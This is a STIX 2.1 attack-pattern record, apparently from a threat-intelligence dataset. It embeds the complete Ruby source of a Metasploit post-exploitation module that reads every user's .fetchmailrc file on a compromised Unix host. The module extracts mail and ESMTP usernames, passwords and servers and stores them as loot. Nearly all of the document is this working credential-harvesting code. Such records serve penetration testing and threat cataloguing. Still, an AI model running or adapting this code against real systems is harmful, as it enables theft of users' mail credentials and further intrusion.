{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6020522a-378b-4e3b-b7a9-1aac15454528",
    "created": "2024-08-14T16:33:19.175457Z",
    "modified": "2024-08-14T16:33:19.175461Z",
    "name": "UNIX Gather .fetchmailrc Credentials",
    "description": " Post Module to obtain credentials saved for IMAP, POP and other mail retrieval protocols in fetchmail's .fetchmailrc  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/fetchmailrc_creds.rb",
            "external_id": "fetchmailrc_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather .fetchmailrc Credentials',\n        'Description' => %q{\n          Post Module to obtain credentials saved for IMAP, POP and other mail\n          retrieval protocols in fetchmail's .fetchmailrc\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Jon Hart <jhart[at]spoofed.org>' ],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => [ 'shell' ]\n      )\n    )\n  end\n\n  def run\n    # A table to store the found credentials.\n    cred_table = Rex::Text::Table.new(\n      'Header' => '.fetchmailrc credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Username',\n        'Password',\n        'Server',\n        'Protocol',\n        'Port'\n      ]\n    )\n\n    # walk through each user directory\n    enum_user_directories.each do |user_dir|\n      fetchmailrc_file = ::File.join(user_dir, '.fetchmailrc')\n      unless readable? fetchmailrc_file\n        vprint_error(\"Couldn't read #{fetchmailrc_file}\")\n        next\n      end\n      print_status(\"Reading: #{fetchmailrc_file}\")\n      # read their .fetchmailrc if it exists\n      lines = read_file(fetchmailrc_file).each_line.to_a\n      next if (lines.size <= 0)\n\n      print_status(\"Parsing #{fetchmailrc_file}\")\n\n      # delete any comments\n      lines.delete_if { |l| l =~ /^#/ }\n      # trim any leading/trailing whitespace\n      lines.map(&:strip!)\n      # turn any multi-line config options into a single line to ease parsing\n      (lines.size - 1).downto(0) do |i|\n        # if the line we are reading doesn't signify a new configuration section...\n        next if ((lines[i] =~ /^(?:defaults|poll|skip)\\s+/))\n\n        # append the current line to the previous\n        lines[i - 1] << ' '\n        lines[i - 1] << lines[i]\n        # and axe the current line\n        lines.delete_at(i)\n      end\n\n      # any default options found, used as defaults for poll or skip lines\n      # that are missing options and want to use defaults\n      defaults = {}\n\n      # now parse each line found\n      lines.each do |line|\n        # if there is a 'default' line, save any of these options as\n        # they should be used when subsequent poll/skip lines are missing them.\n        if (line =~ /^defaults/)\n          defaults = parse_fetchmailrc_line(line).first\n          next\n        end\n\n        # now merge the currently parsed line with whatever defaults may have\n        # been found, then save if there is enough to save\n        parse_fetchmailrc_line(line).each do |cred|\n          cred = defaults.merge(cred)\n          if (cred[:host] && cred[:protocol])\n            if (cred[:users].size == cred[:passwords].size)\n              cred[:users].each_index do |i|\n                cred_table << [ cred[:users][i], cred[:passwords][i], cred[:host], cred[:protocol], cred[:port] ]\n              end\n            else\n              print_error(\"Skipping '#{line}' -- number of users and passwords not equal\")\n            end\n          end\n        end\n      end\n    end\n\n    if cred_table.rows.empty?\n      print_status('No creds collected')\n    else\n      print_line(\"\\n\" + cred_table.to_s)\n\n      # store all found credentials\n      p = store_loot(\n        'fetchmailrc.creds',\n        'text/csv',\n        session,\n        cred_table.to_csv,\n        'fetchmailrc_credentials.txt',\n        '.fetchmailrc credentials'\n      )\n\n      print_status(\"Credentials stored in: #{p}\")\n    end\n  end\n\n  # Parse a line +line+, assumed to be from a fetchmail configuration file,\n  # returning an array of all credentials found on that line\n  def parse_fetchmailrc_line(line)\n    creds = []\n    cred = {}\n    # parse and clean any users\n    users = line.scan(/\\s+user(?:name)?\\s+(\\S+)/).flatten\n    unless users.empty?\n      cred[:users] = []\n      users.each do |user|\n        cred[:users] << user.gsub(/^\"/, '').gsub(/\"$/, '')\n      end\n    end\n    # parse and clean any passwords\n    passwords = line.scan(/\\s+pass(?:word)?\\s+(\\S+)/).flatten\n    unless passwords.empty?\n      cred[:passwords] = []\n      passwords.each do |password|\n        cred[:passwords] << password.gsub(/^\"/, '').gsub(/\"$/, '')\n      end\n    end\n    # parse any hosts, ports and protocols\n    cred[:protocol] = ::Regexp.last_match(1) if (line =~ /\\s+proto(?:col)?\\s+(\\S+)/)\n    cred[:port] = ::Regexp.last_match(1) if (line =~ /\\s+(?:port|service)\\s+(\\S+)/)\n    cred[:host] = ::Regexp.last_match(1) if (line =~ /^(?:poll|skip)\\s+(\\S+)/)\n    # a 'via' option overrides poll/skip\n    cred[:host] = ::Regexp.last_match(1) if (line =~ /\\s+via\\s+(\\S+)/)\n    # save this credential\n    creds << cred\n    # fetchmail can also \"forward\" mail by pulling it down with POP/IMAP and then\n    # connecting to some SMTP server and sending it.  If ESMTP AUTH (RFC 2554) credentials\n    # are specified, steal those too.\n    cred = {}\n    cred[:users] = [ ::Regexp.last_match(1) ] if (line =~ /\\s+esmtpname\\s+(\\S+)/)\n    cred[:passwords] = [ ::Regexp.last_match(1) ] if (line =~ /\\s+esmtppassword\\s+(\\S+)/)\n    # XXX: what is the best way to get the host we are currently looting?  localhost is lame.\n    cred[:host] = (line =~ /\\s+smtphost\\s+(\\S+)/ ? ::Regexp.last_match(1) : 'localhost')\n    cred[:protocol] = 'esmtp'\n    # save the ESMTP credentials if we've found enough\n    creds << cred if (cred[:users] && cred[:passwords] && cred[:host])\n    # return all found credentials\n    creds\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}